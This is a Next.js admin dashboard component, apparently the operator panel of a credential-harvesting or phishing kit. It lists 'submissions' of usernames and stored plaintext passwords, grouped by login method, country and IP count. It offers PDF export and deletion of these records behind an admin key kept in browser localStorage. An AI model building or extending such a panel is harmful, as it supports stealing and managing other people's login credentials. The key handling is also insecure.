'use client'

import { useState, useEffect } from 'react'
import Link from 'next/link'

interface SubmissionSummary {
  total: number
  methods: number
  countries: number
  ips: number
}

interface MethodBreakdown {
  method: string
  count: number
}

interface Submission {
  id: number
  username: string
  password: string
  method: string
  country: string
  created_at: string
}

export default function ProjectAdminDashboard() {
  const [adminKey, setAdminKey] = useState('')
  const [summary, setSummary] = useState<SubmissionSummary | null>(null)
  const [byMethod, setByMethod] = useState<MethodBreakdown[]>([])
  const [recent, setRecent] = useState<Submission[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState('')

  useEffect(() => {
    const saved = localStorage.getItem('adminKey')
    if (saved) setAdminKey(saved)
  }, [])

  useEffect(() => {
    if (!adminKey) return
    fetchDashboard()
  }, [adminKey])

  const fetchDashboard = async () => {
    try {
      setLoading(true)
      const response = await fetch('/api/admin/project', {
        headers: { 'X-Admin-Key': adminKey },
      })
      if (!response.ok) throw new Error('Unauthorized')
      const data = await response.json()
      setSummary(data.summary)
      setByMethod(data.byMethod || [])
      setRecent(data.recent || [])
      setError('')
    } catch (err) {
      setError('Failed to load dashboard')
    } finally {
      setLoading(false)
    }
  }

  const handleExportPDF = async () => {
    try {
      const response = await fetch('/api/admin/project/export/pdf', {
        headers: { 'X-Admin-Key': adminKey },
      })
      if (!response.ok) throw new Error('Failed to export')
      const blob = await response.blob()
      const url = window.URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = `submissions-${new Date().toISOString().slice(0, 10)}.pdf`
      a.click()
    } catch (err) {
      alert('Failed to export PDF')
    }
  }

  const handleDeleteSubmission = async (id: number) => {
    if (!confirm('Are you sure?')) return
    try {
      const response = await fetch(`/api/admin/project/submissions/${id}`, {
        method: 'DELETE',
        headers: { 'X-Admin-Key': adminKey },
      })
      if (!response.ok) throw new Error('Failed to delete')
      setRecent(recent.filter((r) => r.id !== id))
    } catch (err) {
      alert('Failed to delete submission')
    }
  }

  if (!adminKey) {
    return (
      <div style={{ padding: '2rem', maxWidth: '600px', margin: '0 auto' }}>
        <h1>Admin Authentication</h1>
        <input
          type="password"
          placeholder="Enter Admin Key"
          value={adminKey}
          onChange={(e) => {
            setAdminKey(e.target.value)
            localStorage.setItem('adminKey', e.target.value)
          }}
          style={{
            width: '100%',
            padding: '0.5rem',
            marginBottom: '1rem',
            border: '1px solid #ccc',
            borderRadius: '4px',
          }}
        />
        <button onClick={() => fetchDashboard()} style={{ padding: '0.5rem 1rem' }}>
          Authenticate
        </button>
      </div>
    )
  }

  return (
    <div style={{ padding: '2rem', maxWidth: '1200px', margin: '0 auto' }}>
      <div style={{ marginBottom: '2rem' }}>
        <Link href="/admin/universal" style={{ marginRight: '1rem', color: '#0066cc' }}>
          View Universal Dashboard →
        </Link>
        <Link href="/" style={{ color: '#0066cc' }}>
          Back to Home
        </Link>
      </div>

      <h1>Project Admin Dashboard</h1>

      {error && <div style={{ color: 'red', marginBottom: '1rem' }}>{error}</div>}

      {loading ? (
        <p>Loading...</p>
      ) : (
        <>
          {/* Summary Stats */}
          {summary && (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '1rem', marginBottom: '2rem' }}>
              <div style={{ padding: '1rem', border: '1px solid #ddd', borderRadius: '4px', textAlign: 'center' }}>
                <div style={{ fontSize: '2rem', fontWeight: 'bold' }}>{summary.total}</div>
                <div style={{ color: '#666' }}>Total Submissions</div>
              </div>
              <div style={{ padding: '1rem', border: '1px solid #ddd', borderRadius: '4px', textAlign: 'center' }}>
                <div style={{ fontSize: '2rem', fontWeight: 'bold' }}>{summary.methods}</div>
                <div style={{ color: '#666' }}>Methods</div>
              </div>
              <div style={{ padding: '1rem', border: '1px solid #ddd', borderRadius: '4px', textAlign: 'center' }}>
                <div style={{ fontSize: '2rem', fontWeight: 'bold' }}>{summary.countries}</div>
                <div style={{ color: '#666' }}>Countries</div>
              </div>
              <div style={{ padding: '1rem', border: '1px solid #ddd', borderRadius: '4px', textAlign: 'center' }}>
                <div style={{ fontSize: '2rem', fontWeight: 'bold' }}>{summary.ips}</div>
                <div style={{ color: '#666' }}>IPs</div>
              </div>
            </div>
          )}

          {/* Actions */}
          <div style={{ marginBottom: '2rem' }}>
            <button
              onClick={handleExportPDF}
              style={{ padding: '0.5rem 1rem', marginRight: '1rem', cursor: 'pointer' }}
            >
              📥 Export as PDF
            </button>
            <button
              onClick={() => window.location.reload()}
              style={{ padding: '0.5rem 1rem', cursor: 'pointer' }}
            >
              🔄 Refresh
            </button>
          </div>

          {/* By Method Breakdown */}
          <div style={{ marginBottom: '2rem', padding: '1rem', border: '1px solid #ddd', borderRadius: '4px' }}>
            <h2>Submissions by Method</h2>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '1rem' }}>
              {byMethod.map((item) => (
                <div key={item.method} style={{ padding: '1rem', border: '1px solid #eee', borderRadius: '4px' }}>
                  <div style={{ fontSize: '1.5rem', fontWeight: 'bold' }}>{item.count}</div>
                  <div style={{ color: '#666', textTransform: 'capitalize' }}>{item.method}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Recent Submissions */}
          <div style={{ padding: '1rem', border: '1px solid #ddd', borderRadius: '4px' }}>
            <h2>Recent Submissions</h2>
            {recent.length === 0 ? (
              <p>No submissions</p>
            ) : (
              <div style={{ overflowX: 'auto' }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.875rem' }}>
                  <thead>
                    <tr style={{ borderBottom: '2px solid #ddd' }}>
                      <th style={{ textAlign: 'left', padding: '0.5rem' }}>ID</th>
                      <th style={{ textAlign: 'left', padding: '0.5rem' }}>Username</th>
                      <th style={{ textAlign: 'left', padding: '0.5rem' }}>Password</th>
                      <th style={{ textAlign: 'left', padding: '0.5rem' }}>Method</th>
                      <th style={{ textAlign: 'left', padding: '0.5rem' }}>Country</th>
                      <th style={{ textAlign: 'left', padding: '0.5rem' }}>Date</th>
                      <th style={{ textAlign: 'center', padding: '0.5rem' }}>Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {recent.map((sub) => (
                      <tr key={sub.id} style={{ borderBottom: '1px solid #eee' }}>
                        <td style={{ padding: '0.5rem' }}>{sub.id}</td>
                        <td style={{ padding: '0.5rem' }}>{sub.username}</td>
                        <td style={{ padding: '0.5rem' }}>{'*'.repeat(sub.password.length)}</td>
                        <td style={{ padding: '0.5rem', textTransform: 'capitalize' }}>{sub.method}</td>
                        <td style={{ padding: '0.5rem' }}>{sub.country}</td>
                        <td style={{ padding: '0.5rem' }}>{new Date(sub.created_at).toLocaleDateString()}</td>
                        <td style={{ textAlign: 'center', padding: '0.5rem' }}>
                          <button
                            onClick={() => handleDeleteSubmission(sub.id)}
                            style={{
                              padding: '0.25rem 0.5rem',
                              background: '#ff4444',
                              color: 'white',
                              border: 'none',
                              borderRadius: '3px',
                              cursor: 'pointer',
                            }}
                          >
                            Delete
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </>
      )}
    </div>
  )
}
